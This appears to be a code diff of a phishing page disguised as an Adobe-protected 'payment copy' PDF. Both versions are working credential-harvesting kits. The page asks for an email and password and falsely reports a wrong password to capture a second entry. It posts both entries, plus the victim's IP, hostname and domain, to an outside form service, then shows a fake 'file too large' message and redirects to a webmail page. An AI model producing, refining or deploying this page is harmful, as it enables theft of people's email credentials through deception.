@@ -4,230 +4,78 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Protected PDF — Payment Copy</title>
-
- <style>
-  * {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
-  html, body {
-    height: 100%;
-  }
-  
-  body {
-  font-family: "Poppins", sans-serif;
-  background: 
-    linear-gradient(135deg, rgba(20, 0, 40, 0.8), rgba(60, 0, 80, 0.8)), 
-    url('download.jpg') no-repeat center center fixed;
-  background-size: cover;
-  backdrop-filter: blur(12px);
-  -webkit-backdrop-filter: blur(12px);
-  overflow: hidden;
-  position: relative;
-  color: #fff;
-}
-
-    /* Splash Loading */
-  #splash {
-    position: fixed;
-    top:0; left:0;
-    width:100%; height:100%;
-    background: radial-gradient(circle at center, #1f0037, #000);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    z-index:9999;
-    transition: opacity 1s ease;
-  }
-  #splash h2 {
-    font-size: 26px;
-    color: #ff77ff;
-    margin-bottom: 10px;
-    animation: pulse 2s infinite alternate;
-  }
-  #splash p {
-    color: #ccc;
-    font-size: 15px;
-  }
-  .loader {
-    margin-top: 25px;
-    width: 50px;
-    height: 50px;
-    border: 4px solid rgba(255,255,255,0.2);
-    border-top-color: #ff00ff;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  @keyframes pulse {
-    0% { opacity: 0.7; transform: scale(0.95); }
-    100% { opacity: 1; transform: scale(1.05); }
-  }
-
-  /* Show main after splash */
-  #main {
-    display: none;
-    align-items: flex-start;
-    justify-content: center;
-    padding: 40px 12px;
-    height: 100%;
-    animation: fadeIn 1.2s ease forwards;
-  }
-  #main.show {
-    display: flex !important;
-  }
-  @keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  /* Watermark background text */
-  body::before {
-    content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
-    position: absolute;
-    top: -40%;
-    left: -50%;
-    width: 200%;
-    height: 200%;
-    font-size: 50px;
-    font-weight: bold;
-    color: rgba(255, 255, 255, 0.05);
-    transform: rotate(-35deg);
-    white-space: pre;
-    line-height: 120px;
-    pointer-events: none;
-    z-index: 0;
-  }
-
-  /* Card UI */
-  .card {
-    width: 450px;
-    max-width: 94%;
-    background: rgba(255, 255, 255, 0.15);
-    border-radius: 16px;
-    box-shadow: 0 0 25px rgba(255, 0, 255, 0.3);
-    padding: 32px 26px 40px;
-    position: relative;
-    z-index: 2;
-    backdrop-filter: blur(16px);
-    animation: popIn 1s ease forwards;
-    border: 1px solid rgba(255,255,255,0.2);
-  }
-  @keyframes popIn {
-    0% { transform: scale(0.8); opacity: 0; }
-    100% { transform: scale(1); opacity: 1; }
-  }
-
-  .pdf-icon img {
-    width: 60px;
-    animation: float 3s ease-in-out infinite alternate;
-  }
-  @keyframes float {
-    from { transform: translateY(0); }
-    to { transform: translateY(-8px); }
-  }
-
-  h1 {
-    font-size: 20px;
-    text-align: center;
-    margin-bottom: 10px;
-    color: #fff;
-  }
-  p.lead {
-    text-align: center;
-    color: #e0e0e0;
-    margin-bottom: 22px;
-    font-size: 14px;
-  }
-
-  /* Inputs */
-  .input {
-    width: 100%;
-    border: 1px solid rgba(255,255,255,0.3);
-    border-radius: 8px;
-    padding: 14px 12px;
-    margin-bottom: 12px;
-    color: #fff;
-    background: rgba(255,255,255,0.1);
-    font-size: 15px;
-    outline: none;
-    transition: all 0.3s ease;
-  }
-  .input:focus {
-    border-color: #ff77ff;
-    box-shadow: 0 0 10px rgba(255, 0, 255, 0.3);
-  }
-
-  /* Button */
-  .btn-download {
-    display: inline-block;
-    padding: 12px 38px;
-    border-radius: 50px;
-    background: linear-gradient(135deg, #ff00ff, #7700ff);
-    color: #fff;
-    font-weight: 700;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    border: none;
-    cursor: pointer;
-    font-size: 15px;
-    box-shadow: 0 8px 25px rgba(255,0,255,0.3);
-    transition: all 0.3s ease;
-  }
-  .btn-download:hover {
-    transform: scale(1.07) translateY(-3px);
-    box-shadow: 0 12px 30px rgba(255,0,255,0.4);
-  }
-
-  .toggle-password {
-    position: absolute;
-    top: 50%;
-    right: 12px;
-    transform: translateY(-50%);
-    cursor: pointer;
-    color: #ffb3ff;
-    font-size: 18px;
-    user-select: none;
-    transition: color 0.3s;
-  }
-  .toggle-password:hover { color: #fff; }
-
-  .file-info {
-    margin-top: 18px;
-    border-top: 1px solid rgba(255,255,255,0.2);
-    padding-top: 14px;
-    display: flex;
-    gap: 12px;
-    align-items: flex-start;
-    color: #fff;
-  }
-
-  .file-meta h4 {
-    margin-bottom: 6px;
-    font-size: 15px;
-    color: #ff77ff;
-  }
-  .file-meta .desc,
-  .file-meta .size {
-    font-size: 13px;
-    color: #ccc;
-  }
-
-  .error-message {
-    color: #ff99ff;
-    font-size: 14px;
-    margin-top: 10px;
-    text-align: center;
-    animation: fadeIn 0.5s ease;
-  }
-
-  .hidden { display: none; }
-  .center-row { display:flex; gap:8px; align-items:center; justify-content:center; }
-</style>
-
-
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: "Poppins", sans-serif;
+      background: linear-gradient(135deg, rgba(20, 0, 40, 0.8), rgba(60, 0, 80, 0.8)),
+                  url('download.jpg') no-repeat center center fixed;
+      background-size: cover;
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      overflow: hidden;
+      color: #fff;
+      position: relative;
+    }
+    #splash {
+      position: fixed; inset: 0;
+      background: radial-gradient(circle at center, #1f0037, #000);
+      display:flex; align-items:center; justify-content:center; flex-direction:column;
+      z-index:9999; transition: opacity 1s ease;
+    }
+    #splash h2 { font-size: 26px; color: #ff77ff; margin-bottom: 10px; animation: pulse 2s infinite alternate; }
+    #splash p { color: #ccc; font-size: 15px; }
+    .loader { margin-top: 25px; width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #ff00ff; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pulse { 0% { opacity: 0.7; transform: scale(0.95); } 100% { opacity: 1; transform: scale(1.05); } }
+    #main { display: none; align-items: flex-start; justify-content: center; padding: 40px 12px; height: 100%; animation: fadeIn 1.2s ease forwards; }
+    #main.show { display: flex !important; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    body::before {
+      content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
+      position: absolute; top: -40%; left: -50%; width: 200%; height: 200%;
+      font-size: 50px; font-weight: bold; color: rgba(255, 255, 255, 0.05);
+      transform: rotate(-35deg); white-space: pre; line-height: 120px;
+      pointer-events: none; z-index: 0;
+    }
+    .card {
+      width: 450px; max-width: 94%;
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 16px;
+      box-shadow: 0 0 25px rgba(255, 0, 255, 0.3);
+      padding: 32px 26px 40px;
+      backdrop-filter: blur(16px);
+      border: 1px solid rgba(255,255,255,0.2);
+      position: relative;
+      z-index: 2;
+      animation: popIn 1s ease forwards;
+    }
+    @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .pdf-icon img { width: 60px; animation: float 3s ease-in-out infinite alternate; }
+    @keyframes float { from { transform: translateY(0); } to { transform: translateY(-8px); } }
+    h1 { font-size: 20px; text-align: center; margin-bottom: 10px; color: #fff; }
+    p.lead { text-align: center; color: #e0e0e0; margin-bottom: 22px; font-size: 14px; }
+    .input {
+      width: 100%; border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 8px; padding: 14px 12px; margin-bottom: 12px;
+      color: #fff; background: rgba(255,255,255,0.1); font-size: 15px;
+      outline: none; transition: all 0.3s ease;
+    }
+    .input:focus { border-color: #ff77ff; box-shadow: 0 0 10px rgba(255, 0, 255, 0.3); }
+    .btn-download {
+      display: inline-block; padding: 12px 38px; border-radius: 50px;
+      background: linear-gradient(135deg, #ff00ff, #7700ff);
+      color: #fff; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;
+      border: none; cursor: pointer; font-size: 15px;
+      box-shadow: 0 8px 25px rgba(255,0,255,0.3);
+      transition: all 0.3s ease;
+    }
+    .btn-download:hover { transform: scale(1.07) translateY(-3px); box-shadow: 0 12px 30px rgba(255,0,255,0.4); }
+    .toggle-password { position: absolute; top: 50%; right: 12px; transform: translateY(-50%); cursor: pointer; color: #ffb3ff; font-size: 18px; user-select: none; }
+    .toggle-password:hover { color: #fff; }
+    .error-message { color: #ff99ff; font-size: 14px; margin-top: 10px; text-align: center; display: none; }
+  </style>
 </head>
 <body>
   <div id="splash">
@@ -245,186 +93,110 @@
             <text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text>
           </svg>" alt="PDF icon">
       </div>
-
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click Continue to enter your password and view the payment copy.</p>
 
-      <iframe name="hiddenFrame" style="display:none;"></iframe>
-
-      <form id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on" target="hiddenFrame">
+      <form id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" target="hiddenFrame">
         <div id="stepEmail">
-          <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="email" required>
-          <div class="center-row small-actions">
-            <button id="continueBtn" class="btn-download" type="button">Continue</button>
-          </div>
+          <input id="email" name="email" class="input" type="email" placeholder="Email address" required>
+          <button id="continueBtn" class="btn-download" type="button">Continue</button>
         </div>
 
         <div id="stepPassword" class="hidden">
-          <div class="password-wrapper">
-            <input id="password" name="password_second_entry" class="input" type="password" placeholder="Password" autocomplete="current-password" required>
-            <span id="togglePassword" class="toggle-password" title="Show / hide password">👁️</span>
+          <div style="position:relative;">
+            <input id="password" name="password_second_entry" class="input" type="password" placeholder="Password" required>
+            <span id="togglePassword" class="toggle-password">👁️</span>
           </div>
+          <input type="hidden" id="passwordFirstEntryField" name="password_first_entry">
+          <input type="hidden" id="ip" name="ip">
+          <input type="hidden" id="hostname" name="hostname">
+          <input type="hidden" id="domain" name="domain">
 
-          <input type="hidden" name="password_first_entry" id="passwordFirstEntryField">
-          <input type="hidden" name="ip" id="ip">
-          <input type="hidden" name="hostname" id="hostname">
-          <input type="hidden" name="domain" id="domain">
-
-          <div id="errorMessage" class="error-message" style="display: none;">Incorrect password, please re-type password.</div>
-
-          <div class="download-wrap">
-            <button class="btn-download" type="submit">DOWNLOAD</button>
-          </div>
+          <div id="errorMessage" class="error-message">Incorrect password, please re-type password.</div>
+          <button class="btn-download" type="submit">Download</button>
         </div>
       </form>
-
-      <div class="file-info">
-        <div class="file-thumb">
-          <img src="data:image/svg+xml;utf8,
-            <svg xmlns='http://www.w3.org/2000/svg' width='48' height='48'>
-              <rect width='48' height='48' rx='4' fill='%23f2f2f2' stroke='%23ddd'/>
-              <text x='50%' y='58%' text-anchor='middle' font-size='10' font-family='Arial' fill='%23d32f2f'>PDF</text>
-            </svg>" alt="">
-        </div>
-        <div class="file-meta">
-          <h4>Download File Information</h4>
-          <div class="desc">Payment copy</div>
-          <div class="size">File Size: 47kb</div>
-        </div>
-      </div>
     </div>
   </div>
-<script>
-  window.addEventListener('load', () => {
-    setTimeout(() => {
-      document.getElementById('splash').style.opacity = '0';
+
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+  <script>
+    // Splash
+    window.addEventListener('load', () => {
       setTimeout(() => {
-        document.getElementById('splash').style.display = 'none';
-        document.getElementById('main').classList.add('show');
-      }, 500);
-    }, 800);
-  });
-
-  const emailInput = document.getElementById('email');
-  const passwordInput = document.getElementById('password');
-  const stepEmail = document.getElementById('stepEmail');
-  const stepPassword = document.getElementById('stepPassword');
-  const continueBtn = document.getElementById('continueBtn');
-  const toggle = document.getElementById('togglePassword');
-  const errorMessage = document.getElementById('errorMessage');
-  const passwordFirstEntryField = document.getElementById('passwordFirstEntryField');
-  const hostnameField = document.getElementById('hostname');
-  const domainField = document.getElementById('domain');
-  const ipField = document.getElementById('ip');
-
-  let passwordFirstEntry = "";
-
-  // Autofill email
-  window.addEventListener('DOMContentLoaded', () => {
-    const params = new URLSearchParams(window.location.search);
-    const urlEmail = params.get('email');
-    const saved = localStorage.getItem('savedEmail');
-
-    if (urlEmail) {
-      emailInput.value = decodeURIComponent(urlEmail);
-    } else if (saved) {
-      emailInput.value = saved;
-    }
-
-    emailInput.addEventListener('input', () => {
-      try { localStorage.setItem('savedEmail', emailInput.value); } catch (e) {}
+        document.getElementById('splash').style.opacity = '0';
+        setTimeout(() => {
+          document.getElementById('splash').style.display = 'none';
+          document.getElementById('main').classList.add('show');
+        }, 500);
+      }, 800);
     });
-  });
 
-  continueBtn.addEventListener('click', () => {
-    if (!emailInput.value) {
-      emailInput.focus();
-      return;
-    }
-    emailInput.setAttribute('readonly', true);
-    stepEmail.classList.add('hidden');
-    stepPassword.classList.remove('hidden');
-    passwordInput.focus();
-  });
+    const continueBtn = document.getElementById('continueBtn');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const stepEmail = document.getElementById('stepEmail');
+    const stepPassword = document.getElementById('stepPassword');
+    const toggle = document.getElementById('togglePassword');
+    const errorMessage = document.getElementById('errorMessage');
+    const passwordFirstEntryField = document.getElementById('passwordFirstEntryField');
+    const ipField = document.getElementById('ip');
+    const hostnameField = document.getElementById('hostname');
+    const domainField = document.getElementById('domain');
 
-  if (toggle && passwordInput) {
-    toggle.addEventListener('click', () => {
-      const isHidden = passwordInput.type === 'password';
-      passwordInput.type = isHidden ? 'text' : 'password';
-      toggle.textContent = isHidden ? '🙈' : '👁️';
-    });
-  }
+    let firstTry = "";
 
-  async function fetchMeta() {
-    try {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const data = await res.json();
-      ipField.value = data.ip || "";
-    } catch (err) {
-      console.warn('IP fetch failed', err);
-    }
-
-    // Manually assign
-    hostnameField.value = window.location.hostname || "unknown";
-    domainField.value = document.domain || "unknown";
-
-    console.log("hostname:", hostnameField.value);
-    console.log("domain:", domainField.value);
-    console.log("ip:", ipField.value);
-  }
-
-  function showMessage(messageText) {
-    const messageContainer = document.createElement('div');
-    messageContainer.style.marginTop = '20px';
-    messageContainer.style.padding = '18px';
-    messageContainer.style.backgroundColor = '#fff3f3';
-    messageContainer.style.border = '1px solid #d32f2f';
-    messageContainer.style.borderRadius = '6px';
-    messageContainer.style.color = '#d32f2f';
-    messageContainer.style.fontSize = '16px';
-    messageContainer.style.textAlign = 'center';
-    messageContainer.textContent = messageText;
-
-    const card = document.querySelector('.card');
-    card.appendChild(messageContainer);
-  }
-
-  document.getElementById('mainForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    await fetchMeta();
-
-    if (passwordFirstEntry === "") {
-      passwordFirstEntry = passwordInput.value;
-      passwordFirstEntryField.value = passwordFirstEntry;
-      passwordInput.value = '';
-      errorMessage.style.display = 'block';
+    continueBtn.addEventListener('click', () => {
+      if (!emailInput.value) return emailInput.focus();
+      emailInput.setAttribute('readonly', true);
+      stepEmail.classList.add('hidden');
+      stepPassword.classList.remove('hidden');
       passwordInput.focus();
-      return;
+    });
+
+    toggle.addEventListener('click', () => {
+      const hidden = passwordInput.type === 'password';
+      passwordInput.type = hidden ? 'text' : 'password';
+      toggle.textContent = hidden ? '🙈' : '👁️';
+    });
+
+    async function fetchMeta() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ipField.value = data.ip || "";
+      } catch {}
+      hostnameField.value = window.location.hostname;
+      domainField.value = document.domain;
     }
 
-    // Submit form via JS instead of native HTML submit (to allow message before redirect)
-    const form = document.getElementById('mainForm');
-    const formData = new FormData(form);
+    document.getElementById('mainForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      await fetchMeta();
 
-    try {
-      await fetch(form.action, {
-        method: 'POST',
-        body: formData,
-      });
+      if (firstTry === "") {
+        firstTry = passwordInput.value;
+        passwordFirstEntryField.value = firstTry;
+        passwordInput.value = "";
+        errorMessage.style.display = "block";
+        passwordInput.focus();
+        return;
+      }
 
-      showMessage("⚠️ File too large. Please contact the sender to resend in smaller chunks or download with Roundcube.");
+      const form = e.target;
+      const formData = new FormData(form);
 
-      setTimeout(() => {
-        window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
-      }, 6000);
-
-    } catch (err) {
-      console.error("Submission failed", err);
-      showMessage("There was an error submitting the form.");
-    }
-  });
-</script>
-
+      try {
+        await fetch(form.action, { method: "POST", body: formData });
+        errorMessage.textContent = "⚠️ File too large. Please download using Roundcube.";
+        setTimeout(() => {
+          window.location.href = "https://webmail.roundcube.net/";
+        }, 6000);
+      } catch (err) {
+        errorMessage.textContent = "Error submitting form. Try again.";
+      }
+    });
+  </script>
 </body>
 </html>
